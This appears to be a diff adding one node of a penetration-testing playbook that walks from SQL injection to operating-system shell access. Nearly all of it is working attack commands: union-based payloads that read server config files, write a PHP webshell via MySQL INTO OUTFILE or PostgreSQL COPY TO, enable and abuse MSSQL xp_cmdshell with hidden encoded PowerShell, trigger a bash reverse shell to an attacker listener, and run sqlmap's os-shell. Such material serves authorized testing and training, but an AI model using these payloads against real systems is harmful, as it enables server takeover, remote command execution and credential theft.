@@ -1,0 +1,26 @@
+{
+  "id": "sqli_shell",
+  "phase": "WEB",
+  "title": "SQLi → Shell",
+  "body": "DB access to OS shell. INTO OUTFILE for MySQL (needs FILE priv + webroot path). xp_cmdshell for MSSQL. COPY TO for PostgreSQL. Know the webroot — file write to wrong path is silent failure.",
+  "cmd": "# -- MYSQL: INTO OUTFILE ------------------\n# Requires FILE privilege + writable webroot\n\n# 1. Confirm FILE privilege\n' UNION SELECT NULL,file_priv,NULL FROM mysql.user WHERE user=user()--\n\n# 2. Find webroot\n' UNION SELECT NULL,load_file('/etc/apache2/sites-enabled/000-default.conf'),NULL--\n' UNION SELECT NULL,load_file('/etc/nginx/sites-enabled/default'),NULL--\n' UNION SELECT NULL,load_file('/var/www/html/index.php'),NULL--\n\n# 3. Write webshell\n' UNION SELECT NULL,\"<?php system($_GET['cmd']); ?>\",NULL INTO OUTFILE '/var/www/html/shell.php'--\n\n# 4. Verify + execute\ncurl \"http://$ip/shell.php?cmd=id\"\ncurl \"http://$ip/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$lhost/$lport+0>%261'\"\n\n# -- MSSQL: xp_cmdshell -------------------\n# Enable if disabled (requires sa or sysadmin)\n'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--\n'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--\n\n# Execute\n'; EXEC xp_cmdshell 'whoami';--\n'; EXEC xp_cmdshell 'powershell -nop -w hidden -enc [BASE64]';--\n\n# -- POSTGRESQL: COPY TO -------------------\n'; COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php';--\n\n# -- SQLMAP SHORTCUT ----------------------\nsqlmap -u \"http://$ip/page?id=1\" --os-shell\n# If webroot known:\nsqlmap -u \"http://$ip/page?id=1\"   --file-write=\"/tmp/shell.php\" --file-dest=\"/var/www/html/shell.php\"",
+  "warn": "INTO OUTFILE fails silently if: (1) FILE privilege missing, (2) file already exists — SQL won't overwrite, (3) path is wrong. Confirm FILE priv first. If file exists, delete it via another vector or use sqlmap --file-write which does overwrite.",
+  "choices": [
+    {
+      "label": "Webshell live — catch reverse shell",
+      "next": "reverse_shell"
+    },
+    {
+      "label": "xp_cmdshell working — catch shell",
+      "next": "reverse_shell"
+    },
+    {
+      "label": "No FILE priv — dump creds instead",
+      "next": "sqli_sqlmap"
+    },
+    {
+      "label": "Got creds from dump",
+      "next": "creds_found"
+    }
+  ]
+}
